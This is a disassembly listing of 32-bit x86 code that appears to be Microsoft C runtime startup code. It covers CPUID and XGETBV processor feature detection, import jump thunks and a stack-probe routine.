  405b03:	35 69 6e 65 49       	xor    $0x49656e69,%eax
  405b08:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b0b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405b0e:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  405b13:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b16:	33 c0                	xor    %eax,%eax
  405b18:	40                   	inc    %eax
  405b19:	53                   	push   %ebx
  405b1a:	0f a2                	cpuid
  405b1c:	8b f3                	mov    %ebx,%esi
  405b1e:	5b                   	pop    %ebx
  405b1f:	0b 7d fc             	or     -0x4(%ebp),%edi
  405b22:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  405b25:	0b 7d f8             	or     -0x8(%ebp),%edi
  405b28:	89 03                	mov    %eax,(%ebx)
  405b2a:	89 73 04             	mov    %esi,0x4(%ebx)
  405b2d:	89 4b 08             	mov    %ecx,0x8(%ebx)
  405b30:	89 53 0c             	mov    %edx,0xc(%ebx)
  405b33:	75 43                	jne    0x405b78
  405b35:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405b38:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  405b3d:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  405b42:	74 23                	je     0x405b67
  405b44:	3d 60 06 02 00       	cmp    $0x20660,%eax
  405b49:	74 1c                	je     0x405b67
  405b4b:	3d 70 06 02 00       	cmp    $0x20670,%eax
  405b50:	74 15                	je     0x405b67
  405b52:	3d 50 06 03 00       	cmp    $0x30650,%eax
  405b57:	74 0e                	je     0x405b67
  405b59:	3d 60 06 03 00       	cmp    $0x30660,%eax
  405b5e:	74 07                	je     0x405b67
  405b60:	3d 70 06 03 00       	cmp    $0x30670,%eax
  405b65:	75 11                	jne    0x405b78
  405b67:	8b 3d c4 83 40 00    	mov    0x4083c4,%edi
  405b6d:	83 cf 01             	or     $0x1,%edi
  405b70:	89 3d c4 83 40 00    	mov    %edi,0x4083c4
  405b76:	eb 06                	jmp    0x405b7e
  405b78:	8b 3d c4 83 40 00    	mov    0x4083c4,%edi
  405b7e:	83 7d f4 07          	cmpl   $0x7,-0xc(%ebp)
  405b82:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405b85:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405b88:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405b8b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b8e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405b91:	7c 32                	jl     0x405bc5
  405b93:	6a 07                	push   $0x7
  405b95:	58                   	pop    %eax
  405b96:	33 c9                	xor    %ecx,%ecx
  405b98:	53                   	push   %ebx
  405b99:	0f a2                	cpuid
  405b9b:	8b f3                	mov    %ebx,%esi
  405b9d:	5b                   	pop    %ebx
  405b9e:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  405ba1:	89 03                	mov    %eax,(%ebx)
  405ba3:	89 73 04             	mov    %esi,0x4(%ebx)
  405ba6:	89 4b 08             	mov    %ecx,0x8(%ebx)
  405ba9:	89 53 0c             	mov    %edx,0xc(%ebx)
  405bac:	8b 45 d8             	mov    -0x28(%ebp),%eax
  405baf:	a9 00 02 00 00       	test   $0x200,%eax
  405bb4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405bb7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405bba:	74 09                	je     0x405bc5
  405bbc:	83 cf 02             	or     $0x2,%edi
  405bbf:	89 3d c4 83 40 00    	mov    %edi,0x4083c4
  405bc5:	5f                   	pop    %edi
  405bc6:	5e                   	pop    %esi
  405bc7:	a9 00 00 10 00       	test   $0x100000,%eax
  405bcc:	74 6d                	je     0x405c3b
  405bce:	83 0d 20 80 40 00 04 	orl    $0x4,0x408020
  405bd5:	c7 05 c0 83 40 00 02 	movl   $0x2,0x4083c0
  405bdc:	00 00 00 
  405bdf:	a9 00 00 00 08       	test   $0x8000000,%eax
  405be4:	74 55                	je     0x405c3b
  405be6:	a9 00 00 00 10       	test   $0x10000000,%eax
  405beb:	74 4e                	je     0x405c3b
  405bed:	33 c9                	xor    %ecx,%ecx
  405bef:	0f 01 d0             	xgetbv
  405bf2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405bf5:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405bf8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405bfb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405bfe:	83 e0 06             	and    $0x6,%eax
  405c01:	33 c9                	xor    %ecx,%ecx
  405c03:	83 f8 06             	cmp    $0x6,%eax
  405c06:	75 33                	jne    0x405c3b
  405c08:	85 c9                	test   %ecx,%ecx
  405c0a:	75 2f                	jne    0x405c3b
  405c0c:	a1 20 80 40 00       	mov    0x408020,%eax
  405c11:	83 c8 08             	or     $0x8,%eax
  405c14:	c7 05 c0 83 40 00 03 	movl   $0x3,0x4083c0
  405c1b:	00 00 00 
  405c1e:	f6 45 ec 20          	testb  $0x20,-0x14(%ebp)
  405c22:	a3 20 80 40 00       	mov    %eax,0x408020
  405c27:	74 12                	je     0x405c3b
  405c29:	83 c8 20             	or     $0x20,%eax
  405c2c:	c7 05 c0 83 40 00 05 	movl   $0x5,0x4083c0
  405c33:	00 00 00 
  405c36:	a3 20 80 40 00       	mov    %eax,0x408020
  405c3b:	33 c0                	xor    %eax,%eax
  405c3d:	5b                   	pop    %ebx
  405c3e:	8b e5                	mov    %ebp,%esp
  405c40:	5d                   	pop    %ebp
  405c41:	c3                   	ret
  405c42:	33 c0                	xor    %eax,%eax
  405c44:	39 05 24 80 40 00    	cmp    %eax,0x408024
  405c4a:	0f 95 c0             	setne  %al
  405c4d:	c3                   	ret
  405c4e:	ff 25 d8 60 40 00    	jmp    *0x4060d8
  405c54:	ff 25 d4 60 40 00    	jmp    *0x4060d4
  405c5a:	ff 25 d0 60 40 00    	jmp    *0x4060d0
  405c60:	ff 25 30 61 40 00    	jmp    *0x406130
  405c66:	ff 25 48 61 40 00    	jmp    *0x406148
  405c6c:	ff 25 10 61 40 00    	jmp    *0x406110
  405c72:	ff 25 58 61 40 00    	jmp    *0x406158
  405c78:	ff 25 6c 61 40 00    	jmp    *0x40616c
  405c7e:	ff 25 68 61 40 00    	jmp    *0x406168
  405c84:	ff 25 64 61 40 00    	jmp    *0x406164
  405c8a:	ff 25 60 61 40 00    	jmp    *0x406160
  405c90:	ff 25 4c 61 40 00    	jmp    *0x40614c
  405c96:	ff 25 5c 61 40 00    	jmp    *0x40615c
  405c9c:	ff 25 78 61 40 00    	jmp    *0x406178
  405ca2:	ff 25 54 61 40 00    	jmp    *0x406154
  405ca8:	ff 25 50 61 40 00    	jmp    *0x406150
  405cae:	ff 25 2c 61 40 00    	jmp    *0x40612c
  405cb4:	ff 25 00 61 40 00    	jmp    *0x406100
  405cba:	ff 25 f8 60 40 00    	jmp    *0x4060f8
  405cc0:	ff 25 74 61 40 00    	jmp    *0x406174
  405cc6:	ff 25 44 61 40 00    	jmp    *0x406144
  405ccc:	ff 25 40 61 40 00    	jmp    *0x406140
  405cd2:	ff 25 3c 61 40 00    	jmp    *0x40613c
  405cd8:	ff 25 38 61 40 00    	jmp    *0x406138
  405cde:	ff 25 34 61 40 00    	jmp    *0x406134
  405ce4:	ff 25 34 60 40 00    	jmp    *0x406034
  405cea:	b0 01                	mov    $0x1,%al
  405cec:	c3                   	ret
  405ced:	cc                   	int3
  405cee:	cc                   	int3
  405cef:	cc                   	int3
  405cf0:	51                   	push   %ecx
  405cf1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  405cf5:	2b c8                	sub    %eax,%ecx
  405cf7:	1b c0                	sbb    %eax,%eax
  405cf9:	f7 d0                	not    %eax
  405cfb:	23 c8                	and    %eax,%ecx
  405cfd:	8b c4                	mov    %esp,%eax
  405cff:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  405d04:	3b c8                	cmp    %eax,%ecx
  405d06:	f2 72 0b             	bnd jb 0x405d14
  405d09:	8b c1                	mov    %ecx,%eax
  405d0b:	59                   	pop    %ecx
  405d0c:	94                   	xchg   %eax,%esp
  405d0d:	8b 00                	mov    (%eax),%eax
  405d0f:	89 04 24             	mov    %eax,(%esp)
  405d12:	f2 c3                	bnd ret
  405d14:	2d 00 10 00 00       	sub    $0x1000,%eax
  405d19:	85 00                	test   %eax,(%eax)
  405d1b:	eb e7                	jmp    0x405d04
  405d1d:	cc                   	int3
  405d1e:	ff 25 1c 61 40 00    	jmp    *0x40611c
  405d24:	ff 25 18 61 40 00    	jmp    *0x406118
  405d2a:	ff 25 14 61 40 00    	jmp    *0x406114
  405d30:	ff 25 0c 61 40 00    	jmp    *0x40610c
  405d36:	ff 25 08 61 40 00    	jmp    *0x406108
  405d3c:	ff 25 24 61 40 00    	jmp    *0x406124
  405d42:	ff 25 20 61 40 00    	jmp    *0x406120
